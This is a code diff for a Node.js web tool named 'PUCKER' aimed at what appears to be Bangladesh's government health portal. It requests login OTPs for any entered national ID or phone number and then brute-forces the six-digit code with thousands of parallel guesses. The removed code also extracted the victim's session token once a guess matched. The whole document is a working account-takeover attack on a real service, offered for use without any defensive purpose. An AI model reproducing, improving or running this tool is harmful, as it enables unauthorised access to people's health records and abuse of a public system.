@@ -3,6 +3,16 @@ const fetch = require('node-fetch');
 const app = express();
 
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+let sessionData = {
+    sessionId: "",
+    phone: "",
+    captchaImage: "",
+    showOtpForm: false,
+    otpError: "",
+    otpSuccess: ""
+};
 
 function generateSessionId() {
     return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
@@ -11,8 +21,95 @@ function generateSessionId() {
     });
 }
 
-// সিঙ্গেল ওটিপি ভেরিফিকেশন ফাংশন
-async function verifyOtpRequest(phone, otp) {
+async function getLoginCaptcha() {
+    sessionData.sessionId = generateSessionId();
+    let url = "https://amarswasthyo.mohfw.gov.bd/api/requests/login-captcha";
+    
+    let headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Content-Type": "application/json",
+        "Referer": "https://amarswasthyo.mohfw.gov.bd/login"
+    };
+
+    try {
+        let res = await fetch(url, {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({ sessionId: sessionData.sessionId }),
+            timeout: 7000
+        });
+        
+        let contentType = res.headers.get("content-type");
+        if (contentType && contentType.includes("application/json")) {
+            let data = await res.json();
+            if (data.imageUrl) sessionData.captchaImage = data.imageUrl;
+            if (data.sessionId) sessionData.sessionId = data.sessionId;
+        } else {
+            console.log("Non-JSON response received for captcha");
+        }
+    } catch (e) {
+        console.log("Captcha Error:", e);
+    }
+}
+
+app.get('/', async (req, res) => {
+    if (!sessionData.showOtpForm && !sessionData.otpSuccess) {
+        await getLoginCaptcha();
+    }
+    res.send(renderHTML());
+});
+
+app.post('/', async (req, res) => {
+    let action = req.body.action;
+
+    if (action === 'send_otp') {
+        sessionData.phone = req.body.phone;
+        let captchaAnswer = req.body.captcha_answer;
+
+        let url = "https://amarswasthyo.mohfw.gov.bd/api/requests/send-otp";
+        let headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Content-Type": "application/json",
+            "Referer": "https://amarswasthyo.mohfw.gov.bd/login",
+            "Origin": "https://amarswasthyo.mohfw.gov.bd"
+        };
+        let payload = {
+            captcha: captchaAnswer,
+            sessionId: sessionData.sessionId,
+            hid: sessionData.phone
+        };
+
+        try {
+            let response = await fetch(url, {
+                method: 'POST',
+                headers: headers,
+                body: JSON.stringify(payload),
+                timeout: 7000
+            });
+            let resData = await response.json();
+            if (resData.success === true) {
+                sessionData.showOtpForm = true;
+                sessionData.otpError = "";
+            } else {
+                sessionData.otpError = "Failed to send OTP. Please check info/captcha.";
+                await getLoginCaptcha();
+            }
+        } catch (e) {
+            sessionData.otpError = "Error sending OTP request.";
+            await getLoginCaptcha();
+        }
+    } else if (action === 'verify_otp') {
+        let otp = req.body.otp;
+        let success = await verifyOtpRequest(otp);
+        if (success) {
+            sessionData.showOtpForm = false;
+        }
+    }
+
+    res.redirect('/');
+});
+
+async function verifyOtpRequest(otp) {
     try {
         let csrfRes = await fetch("https://amarswasthyo.mohfw.gov.bd/api/auth/csrf", {
             headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/151" },
@@ -28,7 +125,7 @@ async function verifyOtpRequest(phone, otp) {
         if (!csrfToken) return false;
 
         let postData = new URLSearchParams({
-            hid: phone,
+            hid: sessionData.phone,
             otp: otp,
             redirect: 'false',
             csrfToken: csrfToken,
@@ -53,105 +150,141 @@ async function verifyOtpRequest(phone, otp) {
         let cbData = await callbackRes.json();
 
         if (cbData.url === "https://amarswasthyo.mohfw.gov.bd/login") {
-            let rawSessionCookie = callbackRes.headers.get('set-cookie') || "";
-            let sessionMatch = rawSessionCookie.match(/__Secure-next-auth\.session-token=([^;]+)/);
-            let sessionToken = sessionMatch ? sessionMatch[1] : "Found";
-            return sessionToken;
+            sessionData.otpSuccess = `OTP Auto Matched! Success with OTP: <strong>${otp}</strong>`;
+            return true;
         }
     } catch (e) {}
-    return null;
+    return false;
 }
 
-app.get('/', async (req, res) => {
-    let phoneOrNid = req.query.id;
-
-    if (!phoneOrNid) {
-        return res.send(`
-            <h3>Usage Instructions:</h3>
-            <p>Please provide the 'id' parameter in the URL.</p>
-            <p><b>Example:</b> <a href="/?id=01700000000" target="_blank">/?id=01700000000</a></p>
-        `);
+app.post('/check-otp-batch', async (req, res) => {
+    let { otps } = req.body;
+    if (!otps || !Array.isArray(otps)) {
+        return res.json({ success: false });
     }
 
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.write(`<h2>Processing for ID: ${phoneOrNid}</h2>`);
-    res.write(`<p>Initializing Session and Sending OTP...</p>`);
+    let checks = otps.map(async (otp) => {
+        let matched = await verifyOtpRequest(String(otp));
+        return matched ? otp : null;
+    });
 
-    try {
-        let sessionId = generateSessionId();
-        let captchaUrl = "https://amarswasthyo.mohfw.gov.bd/api/requests/login-captcha";
-        
-        let capRes = await fetch(captchaUrl, {
-            method: 'POST',
-            headers: {
-                "User-Agent": "Mozilla/5.0",
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ sessionId: sessionId })
-        });
-        let capData = await capRes.json();
-        if (capData.sessionId) sessionId = capData.sessionId;
+    let results = await Promise.all(checks);
+    let foundOtp = results.find(result => result !== null);
 
-        // অটো ওটিপি রিকোয়েস্ট (এখানে ডিফল্ট বাইপাস বা ডামি ক্যাপচা অ্যানসার পাঠানো হচ্ছে, প্রয়োজন অনুযায়ী পরিবর্তন করতে পারেন)
-        let sendOtpUrl = "https://amarswasthyo.mohfw.gov.bd/api/requests/send-otp";
-        let otpRes = await fetch(sendOtpUrl, {
-            method: 'POST',
-            headers: {
-                "User-Agent": "Mozilla/5.0",
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                captcha: "1234", // যদি ক্যাপচা প্রয়োজন হয়
-                sessionId: sessionId,
-                hid: phoneOrNid
-            })
-        });
-        let otpJson = await otpRes.json();
+    if (foundOtp) {
+        return res.json({ success: true, matched_otp: foundOtp });
+    }
 
-        res.write(`<p>OTP Request Status: ${JSON.stringify(otpJson)}</p>`);
-        res.write(`<p>Starting Superfast Brute-force / Auto Check...</p>`);
+    res.json({ success: false });
+});
 
-        // রেন্ডম ওটিপি জেনারেট করে চেক করা
-        let otps = [];
-        for(let i=0; i<10000; i++) {
-            otps.push(String(Math.floor(Math.random() * 1000000)).padStart(6, '0'));
-        }
-
-        let batchSize = 50;
-        let matchedOtp = null;
-        let sessionToken = null;
-
-        for (let i = 0; i < otps.length; i += batchSize) {
-            let chunk = otps.slice(i, i + batchSize);
+function renderHTML() {
+    return `
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>PUCKER - Vercel OTP</title>
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    </head>
+    <body>
+        <div class="container mt-5">
+            <div class="row justify-content-center">
+                <div class="col-md-6">
+                    <div class="card shadow">
+                        <div class="card-header bg-dark text-white">
+                            <h4 class="text-center mb-0">PUCKER (Captcha & Auto OTP)</h4>
+                        </div>
+                        <div class="card-body">
+                            ${sessionData.otpSuccess ? `
+                                <div class="alert alert-success">${sessionData.otpSuccess}</div>
+                            ` : sessionData.showOtpForm ? `
+                                <form method="POST" id="otpForm">
+                                    <input type="hidden" name="action" value="verify_otp">
+                                    <div class="mb-3">
+                                        <label for="otp" class="form-label">Enter OTP or Auto Check</label>
+                                        <input type="text" class="form-control" id="otp" name="otp" placeholder="Enter OTP">
+                                    </div>
+                                    <div class="d-grid gap-2">
+                                        <button type="submit" class="btn btn-success">Submit OTP</button>
+                                        <button type="button" id="autoOtpBtn" onclick="startAutoCheck()" class="btn btn-warning text-dark fw-bold">⚡ Superfast Auto OTP Check</button>
+                                    </div>
+                                </form>
+                                <div id="statusBox" class="mt-3 text-center fw-bold text-danger"></div>
+                            ` : `
+                                ${sessionData.otpError ? `<div class="alert alert-danger">${sessionData.otpError}</div>` : ''}
+                                <form method="POST">
+                                    <input type="hidden" name="action" value="send_otp">
+                                    <div class="mb-3">
+                                        <label for="phone" class="form-label">Enter NID / Phone (hid)</label>
+                                        <input type="text" class="form-control" id="phone" name="phone" placeholder="Enter NID or Phone Number" required>
+                                    </div>
+                                    <div class="mb-3 text-center">
+                                        <label class="form-label">Captcha</label><br>
+                                        <div class="border p-2 bg-light d-inline-block">
+                                            ${sessionData.captchaImage ? `<img src="${sessionData.captchaImage}" alt="Captcha" class="img-fluid">` : `<small class="text-danger">Failed to load captcha. Refresh page.</small>`}
+                                        </div>
+                                    </div>
+                                    <div class="mb-3">
+                                        <label for="captcha_answer" class="form-label">Enter Captcha</label>
+                                        <input type="text" class="form-control" id="captcha_answer" name="captcha_answer" placeholder="Enter captcha text" required>
+                                    </div>
+                                    <div class="d-grid">
+                                        <button type="submit" class="btn btn-primary">Send OTP</button>
+                                    </div>
+                                </form>
+                            `}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+        async function startAutoCheck() {
+            const btn = document.getElementById('autoOtpBtn');
+            const statusBox = document.getElementById('statusBox');
+            btn.disabled = true;
             
-            let checks = chunk.map(async (otp) => {
-                let token = await verifyOtpRequest(phoneOrNid, String(otp));
-                return token ? { otp, token } : null;
-            });
+            let otps = [];
+            for(let i=0; i<10000; i++) {
+                otps.push(String(Math.floor(Math.random() * 1000000)).padStart(6, '0'));
+            }
 
-            let results = await Promise.all(checks);
-            let found = results.find(r => r !== null);
+            let batchSize = 50;
+            let found = false;
 
-            if (found) {
-                matchedOtp = found.otp;
-                sessionToken = found.token;
-                break;
+            for (let i = 0; i < otps.length; i += batchSize) {
+                let chunk = otps.slice(i, i + batchSize);
+                statusBox.innerHTML = `Checking OTPs... Tested: ${i} / ${otps.length}`;
+
+                try {
+                    let response = await fetch('/check-otp-batch', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ otps: chunk })
+                    });
+                    let result = await response.json();
+                    if (result.success) {
+                        statusBox.className = "mt-3 text-center fw-bold text-success";
+                        statusBox.innerHTML = `Success! Matched OTP: ${result.matched_otp}`;
+                        found = true;
+                        setTimeout(() => { location.reload(); }, 1500);
+                        break;
+                    }
+                } catch (err) {}
+            }
+
+            if (!found) {
+                statusBox.innerHTML = `Could not match automatically. Please try again.`;
+                btn.disabled = false;
             }
         }
-
-        if (matchedOtp) {
-            res.write(`<h3 style="color: green;">Success! Matched OTP: ${matchedOtp}</h3>`);
-            res.write(`<p>Session Token: ${sessionToken}</p>`);
-        } else {
-            res.write(`<h3 style="color: red;">Could not match automatically. Please try again.</h3>`);
-        }
-        res.end();
-
-    } catch (err) {
-        res.write(`<p style="color: red;">Error: ${err.message}</p>`);
-        res.end();
-    }
-});
+        </script>
+    </body>
+    </html>
+    `;
+}
 
 if (process.env.NODE_ENV !== 'production') {
     app.listen(3000, () => console.log('Server running on port 3000'));
